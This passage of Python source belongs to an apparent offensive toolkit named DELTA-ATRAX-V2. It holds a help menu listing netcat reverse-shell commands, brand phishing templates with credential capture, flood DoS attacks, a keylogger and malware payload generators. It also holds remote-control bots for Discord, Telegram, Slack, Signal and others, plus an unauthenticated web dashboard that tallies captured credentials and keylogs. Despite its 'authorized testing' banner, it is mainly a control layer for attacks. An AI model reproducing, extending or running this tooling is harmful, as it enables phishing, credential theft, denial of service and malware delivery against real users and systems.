║  wget_quiet <url>              - Quiet
║  wget_recursive <url>          - Recursive
║  wget_mirror <url>             - Mirror
║  wget_spider <url>             - Spider
║  wget_header <url> <header>    - Custom header
║  wget_user_agent <url> <ua>    - User agent
║  wget_cookies <url> <file>     - Load cookies
║  wget_limit_rate <url> <rate>  - Limit rate
║  wget_timeout <url> <sec>      - Timeout
║  wget_tries <url> <count>      - Retries
║  wget_no_check_cert <url>      - Skip SSL
║  wget_proxy <url> <proxy>      - Proxy
║  wget_post_data <url> <data>   - POST data
║  wget_method <url> <method>    - Method
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS (20+):{Colors.RESET}
║  netcat <host> <port>          - Basic netcat
║  nc_listen <port>              - Listen mode
║  nc_scan <host> <ports>        - Port scan
║  nc_transfer <host> <port> <file> - Transfer
║  nc_shell <host> <port>        - Shell
║  nc_reverse <host> <port>      - Reverse shell
║  nc_banner <host> <port>       - Banner grab
║  nc_udp <host> <port>          - UDP mode
║  nc_ssl <host> <port>          - SSL mode
║
║{Colors.SUCCESS}🎣 PHISHING TEMPLATES (100+):{Colors.RESET}
║  phish_facebook                - Facebook
║  phish_instagram               - Instagram
║  phish_twitter                 - Twitter/X
║  phish_gmail                   - Gmail
║  phish_microsoft               - Microsoft
║  phish_google                  - Google
║  phish_apple                   - Apple
║  phish_paypal                  - PayPal
║  phish_amazon                  - Amazon
║  phish_netflix                 - Netflix
║  phish_spotify                 - Spotify
║  phish_steam                   - Steam
║  phish_discord                 - Discord
║  ... and 90+ more templates
║  phish_templates               - List all templates
║  phish_start <id> [port]       - Start server
║  phish_stop                    - Stop server
║  phish_creds [id]              - View credentials
║
║{Colors.SUCCESS}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <dur> [threads] - SYN flood
║  dos_udp <ip> <port> <dur> [threads] - UDP flood
║  dos_http <ip> <port> <dur> [threads] - HTTP flood
║  dos_icmp <ip> <dur> [threads] - ICMP flood
║  dos_stop [id]                 - Stop attack
║  dos_status                    - Show attacks
║
║{Colors.SUCCESS}⌨️ KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start (F10 stop)
║  keylogger_stop                - Stop
║  keylogger_status              - Status
║  keylogger_logs [limit]        - View logs
║  keylogger_screenshots         - Screenshots
║  keylogger_clipboard [limit]   - Clipboard
║
║{Colors.SUCCESS}🦠 MALWARE/PAYLOAD:{Colors.RESET}
║  malware_keylogger <name> [host] [port] - Keylogger payload
║  malware_image <name> <image> [host] [port] - Image payload
║  malware_pdf <name> [host] [port] - PDF payload
║  malware_list                  - List payloads
║
║{Colors.SUCCESS}📊 CHART COMMANDS:{Colors.RESET}
║  chart_bar <title> <data>      - Bar chart
║  chart_pie <title> <data>      - Pie chart
║  chart_stats                   - Statistics charts
║  chart_list                    - List charts
║
║{Colors.SUCCESS}☁️ SAAS COMMANDS:{Colors.RESET}
║  saas_create_tenant <name> <email> [tier] - Create tenant
║  saas_list_tenants             - List tenants
║  saas_tenant_info <id>         - Tenant info
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System info
║  threats [limit]               - Recent threats
║  clear                         - Clear screen
║  version                       - Version
║  help                          - This help
║
║{Colors.ACCENT}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# PLATFORM BOTS
# =====================

class DiscordBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        self.config = {'enabled': enabled, 'token': token, 'prefix': prefix}
        return True
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE or not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                await message.channel.send(f"```{output}```")
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")


class TelegramBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        self.config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
        return True
    
    def setup(self) -> bool:
        return TELETHON_AVAILABLE and bool(self.config.get('bot_token'))
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('delta_atrax_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")


class SlackBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        self.config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
        return True
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE or not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(channel=channel, text=f"```{result.get('output', '')[:2000]}```")
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)


class WhatsAppBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        self.config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
        return True
    
    def setup(self) -> bool:
        return SELENIUM_AVAILABLE and WEBDRIVER_MANAGER_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.WARNING}📱 WhatsApp Web opened. Scan QR code.{Colors.RESET}")
            time.sleep(15)
            
            while self.running:
                time.sleep(5)
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")


class SignalBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        self.config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
        return True
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                result = subprocess.run(
                    ['signal-cli', 'receive', '--number', self.config.get('phone_number', '')],
                    capture_output=True, text=True, timeout=30
                )
                if result.stdout:
                    for line in result.stdout.splitlines():
                        if line.startswith('Message:'):
                            msg = line.replace('Message:', '').strip()
                            if msg.startswith(self.config.get('prefix', '!')):
                                cmd = msg[1:].strip()
                                resp = self.handler.execute(cmd, 'signal', 'signal_user')
                                self._send_message(resp.get('output', ''))
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _send_message(self, text: str):
        try:
            cmd = ['signal-cli', 'send', '--number', self.config.get('phone_number', '')]
            if self.config.get('group_id'):
                cmd.extend(['--group', self.config['group_id']])
            cmd.extend(['--message', text[:4000]])
            subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass


class GoogleChatBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        self.config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
        return True
    
    def setup(self) -> bool:
        return bool(self.config.get('webhook_url'))
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        try:
            data = {'text': text[:4000]}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.config['webhook_url'], json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False


class iMessageBot:
    def __init__(self, handler, db):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str], enabled: bool = True, prefix: str = '!') -> bool:
        self.config = {'enabled': enabled, 'phone_numbers': phone_numbers, 'prefix': prefix}
        return True
    
    def setup(self) -> bool:
        return IMESSAGE_AVAILABLE and bool(self.config.get('phone_numbers'))
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        if not IMESSAGE_AVAILABLE:
            return False
        try:
            for phone in self.config.get('phone_numbers', []):
                script = f'''
                tell application "Messages"
                    set targetService to 1st service whose service type = iMessage
                    set targetBuddy to buddy "{phone}" of targetService
                    send "{text[:4000]}" to targetBuddy                end tell
                '''
                subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
            return True
        except:
            return False


# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, handler, db, config):
        self.handler = handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = secrets.token_hex(32)
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🦀 DELTA-ATRAX-V2 - Cybersecurity Dashboard</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #00d4ff;
            --secondary: #ff6b35;
            --accent: #7b2cbf;
            --dark: #0a0a1e;
            --darker: #050510;
            --light: #ffffff;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 50%, #1a1a3e 100%);
            color: var(--light);
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, var(--accent) 0%, var(--primary) 50%, var(--secondary) 100%);
            padding: 20px;
            text-align: center;
            box-shadow: 0 4px 30px rgba(0, 212, 255, 0.3);
        }
        .header h1 {
            font-size: 2.5em;
            text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
            letter-spacing: 3px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(0, 212, 255, 0.2);
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
        }
        .stat-card:hover {
            border-color: var(--primary);
            box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
            transform: translateY(-5px);
        }
        .stat-card h3 {
            font-size: 2.2em;
            color: var(--primary);
            margin-bottom: 5px;
        }
        .stat-card p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9em;
        }
        .section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(0, 212, 255, 0.2);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 20px;
        }
        .section h2 {
            color: var(--primary);
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(0, 212, 255, 0.2);
        }
        .command-input {
            width: 100%;
            padding: 15px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 212, 255, 0.3);
            border-radius: 8px;
            color: white;
            font-size: 16px;
            margin-bottom: 10px;
        }
        .command-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
        }
        button {
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: all 0.3s;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
        }
        .output {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 212, 255, 0.2);
            border-radius: 8px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            margin-top: 15px;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            font-size: 14px;
            line-height: 1.6;
        }
        .charts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
        }
        .chart-container {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            padding: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(0, 212, 255, 0.1);
        }
        th {
            color: var(--primary);
        }
        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .badge-critical { background: rgba(244, 67, 54, 0.3); color: #f44336; }
        .badge-high { background: rgba(255, 152, 0, 0.3); color: #ff9800; }
        .badge-medium { background: rgba(255, 193, 7, 0.3); color: #ffc107; }
        .badge-low { background: rgba(76, 175, 80, 0.3); color: #4caf50; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🦀 DELTA-ATRAX-V2</h1>
        <p>Ultimate Cybersecurity Command & Control Platform</p>
    </div>
    
    <div class="container">
        <div class="stats-grid" id="stats">
            <div class="stat-card"><h3 id="statCommands">0</h3><p>Commands</p></div>
            <div class="stat-card"><h3 id="statThreats">0</h3><p>Threats</p></div>
            <div class="stat-card"><h3 id="statIPs">0</h3><p>Managed IPs</p></div>
            <div class="stat-card"><h3 id="statCreds">0</h3><p>Credentials</p></div>
            <div class="stat-card"><h3 id="statPhish">0</h3><p>Phishing Links</p></div>
            <div class="stat-card"><h3 id="statKeylogs">0</h3><p>Keylogs</p></div>
        </div>
        
        <div class="section">
            <h2>🚀 Command Center</h2>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="commandInput" class="command-input" 
                       placeholder="Enter command... (type 'help' for commands)" 
                       onkeypress="if(event.key === 'Enter') executeCommand()">
                <button onclick="executeCommand()">EXECUTE</button>
            </div>
            <div id="output" class="output">
                <span style="color: #00d4ff;">system></span> Welcome to DELTA-ATRAX-V2
                <br><span style="color: #00d4ff;">system></span> Type 'help' for available commands
            </div>
        </div>
        
        <div class="section">
            <h2>📊 Statistics</h2>
            <div class="charts-grid">
                <div class="chart-container">
                    <canvas id="barChart"></canvas>
                </div>
                <div class="chart-container">
                    <canvas id="pieChart"></canvas>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2>🚨 Recent Threats</h2>
            <table>
                <thead>
                    <tr><th>TIME</th><th>TYPE</th><th>SOURCE IP</th><th>SEVERITY</th></tr>
                </thead>
                <tbody id="threatsTable">
                    <tr><td colspan="4">Loading...</td></tr>
                </tbody>
            </table>
        </div>
    </div>
    
    <script>
        var socket = io();
        var barChart, pieChart;
        
        function initCharts() {
            const barCtx = document.getElementById('barChart').getContext('2d');
            const pieCtx = document.getElementById('pieChart').getContext('2d');
            
            barChart = new Chart(barCtx, {
                type: 'bar',
                data: {
                    labels: ['Commands', 'Threats', 'IPs', 'Creds', 'Phishing'],
                    datasets: [{
                        label: 'Statistics',
                        data: [0, 0, 0, 0, 0],
                        backgroundColor: ['#00d4ff', '#ff6b35', '#7b2cbf', '#00ff88', '#ffcc00']
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: { labels: { color: 'white' } }
                    },
                    scales: {
                        y: { ticks: { color: 'white' }, grid: { color: 'rgba(255,255,255,0.1)' } },
                        x: { ticks: { color: 'white' }, grid: { color: 'rgba(255,255,255,0.1)' } }
                    }
                }
            });
            
            pieChart = new Chart(pieCtx, {
                type: 'pie',
                data: {
                    labels: ['Commands', 'Threats', 'IPs', 'Creds', 'Phishing'],
                    datasets: [{
                        data: [0, 0, 0, 0, 0],
                        backgroundColor: ['#00d4ff', '#ff6b35', '#7b2cbf', '#00ff88', '#ffcc00']
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: { labels: { color: 'white' } }
                    }
                }
            });
        }
        
        function executeCommand() {
            var input = document.getElementById('commandInput');
            var command = input.value.trim();
            if (!command) return;
            
            var output = document.getElementById('output');
            output.innerHTML += '<br><span style="color: #00d4ff;">$></span> ' + command;
            
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: command })
            })
            .then(response => response.json())
            .then(data => {
                output.innerHTML += '<br>' + (data.output || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                output.scrollTop = output.scrollHeight;
                input.value = '';
                updateStats();
            })
            .catch(error => {
                output.innerHTML += '<br><span style="color: #ff6b35;">Error: ' + error + '</span>';
            });
        }
        
        function updateStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('statCommands').textContent = data.total_commands || 0;
                    document.getElementById('statThreats').textContent = data.total_threats || 0;
                    document.getElementById('statIPs').textContent = data.total_managed_ips || 0;
                    document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                    document.getElementById('statPhish').textContent = data.total_phishing_links || 0;
                    document.getElementById('statKeylogs').textContent = data.total_keylogs || 0;
                    
                    if (barChart && pieChart) {
                        const values = [
                            data.total_commands || 0,
                            data.total_threats || 0,
                            data.total_managed_ips || 0,
                            data.captured_credentials || 0,
                            data.total_phishing_links || 0
                        ];
                        barChart.data.datasets[0].data = values;
                        barChart.update();
                        pieChart.data.datasets[0].data = values;
                        pieChart.update();
                    }
                });
        }
        
        function loadThreats() {
            fetch('/api/threats')
                .then(response => response.json())
                .then(data => {
                    var html = '';
                    if (data.threats && data.threats.length > 0) {
                        data.threats.forEach(function(threat) {
                            var badgeClass = 'badge-' + (threat.severity || 'low');
                            html += '<tr>';
                            html += '<td>' + (threat.timestamp || '').substring(0, 19) + '</td>';
                            html += '<td>' + (threat.threat_type || 'Unknown') + '</td>';
                            html += '<td>' + (threat.source_ip || 'Unknown') + '</td>';
                            html += '<td><span class="badge ' + badgeClass + '">' + (threat.severity || 'low').toUpperCase() + '</span></td>';
                            html += '</tr>';
                        });
                    } else {
                        html = '<tr><td colspan="4">No threats detected</td></tr>';
                    }
                    document.getElementById('threatsTable').innerHTML = html;
                });
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            initCharts();
            updateStats();
            loadThreats();
            setInterval(updateStats, 5000);
            setInterval(loadThreats, 5000);
        });
    </script>
</body>
</html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            return jsonify(self.db.get_statistics())
        
        @app.route('/api/threats')
        def api_threats():
            return jsonify({'threats': self.db.get_recent_threats(20)})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")


# =====================
# MAIN APPLICATION
# =====================
class DeltaAtraxV2:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        
        # Initialize engines
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.dos = DOSEngine(self.db, self.config)
        self.spear = SpearPhishingEngine(self.db, self.config)
        self.keylogger = KeyloggerModule(self.db, self.config) if KEYLOGGER_AVAILABLE else None
        self.docker_scanner = DockerScanner(self.db)
        self.re_tools = ReverseEngineeringTools(self.db, self.config)
        self.malware_gen = MalwareGenerator(self.db, self.config)
        self.chart_gen = ChartGenerator(self.db, self.config)
        
        # Initialize bots
        self.discord = DiscordBot(None, self.db)
        self.telegram = TelegramBot(None, self.db)
        self.slack = SlackBot(None, self.db)
        self.whatsapp = WhatsAppBot(None, self.db)
        self.signal = SignalBot(None, self.db)
        self.google_chat = GoogleChatBot(None, self.db)
        self.imessage = iMessageBot(None, self.db)
        
        # Initialize command handler
        self.handler = CommandHandler(
            self.db, self.config, self.ssh, self.traffic,
            self.dos, self.spear, self.keylogger,
            self.docker_scanner, self.re_tools, self.malware_gen, self.chart_gen
        )
        
        # Connect bots to handler
        self.discord.handler = self.handler
        self.telegram.handler = self.handler
        self.slack.handler = self.handler
        self.whatsapp.handler = self.handler
        self.signal.handler = self.handler
        self.google_chat.handler = self.handler
        self.imessage.handler = self.handler
        
        # Initialize web dashboard
        self.web = WebDashboard(self.handler, self.db, self.config)
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.SECONDARY}        🦀 DELTA-ATRAX-V2 v{VERSION} - CYBER COMMAND PLATFORM               {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🦀 500+ Security Commands           • 📡 All Ping Commands (25+)     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🗺️ All Traceroute Commands (30+)     • 🔍 All Nmap Commands (70+)     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🌐 All Curl Commands (70+)           • ⬇️ All Wget Commands (60+)     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔌 All Netcat Commands (20+)         • 🎣 100+ Phishing Templates     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🦠 Malware Payload Generation        • 📊 Bar & Pie Charts            {Colors.PRIMARY}║
║{Colors.SUCCESS}  • ☁️ SaaS Multi-Tenant Architecture    • ⌨️ Advanced Keylogger          {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📱 Multi-Platform Bots               • 💻 Web Dashboard               {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Discord | Telegram | Slack          • Signal | WhatsApp | Google Chat{Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔬 Reverse Engineering Tools        • 🐳 Docker Security Scanning    {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                    🎯 FOR AUTHORIZED SECURITY TESTING ONLY                    {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SUCCESS}🦀 Welcome to DELTA-ATRAX-V2 - Your Ultimate Security Assistant{Colors.RESET}
{Colors.ACCENT}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.ACCENT}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.ACCENT}⌨️ Press F10 to start/stop keylogger{Colors.RESET}
{Colors.ACCENT}🎣 100+ Phishing Templates Available{Colors.RESET}
{Colors.ACCENT}🦠 Malware Payload Generation Ready{Colors.RESET}
{Colors.ACCENT}📊 Bar & Pie Chart Visualization{Colors.RESET}
"""
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'wget', 'nc', 'dig', 'traceroute', 'ssh', 'whois', 'docker']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon - Telegram disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ pynput{Colors.RESET}" if KEYLOGGER_AVAILABLE else f"{Colors.WARNING}⚠️ pynput - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ matplotlib{Colors.RESET}" if GRAPHICS_AVAILABLE else f"{Colors.WARNING}⚠️ matplotlib - Charts disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.WARNING}⚠️ reportlab - PDF disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS}✅ selenium{Colors.RESET}" if SELENIUM_AVAILABLE else f"{Colors.WARNING}⚠️ selenium - WhatsApp disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.ACCENT}Enter chat ID: {Colors.RESET}").strip()
            if token:
                self.telegram.save_config(token, chat_id, True, '/')
                self.telegram.start()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ACCENT}Enter channel ID: {Colors.RESET}").strip()
            if token:
                self.slack.save_config(token, channel, True, '!')
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.ACCENT}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
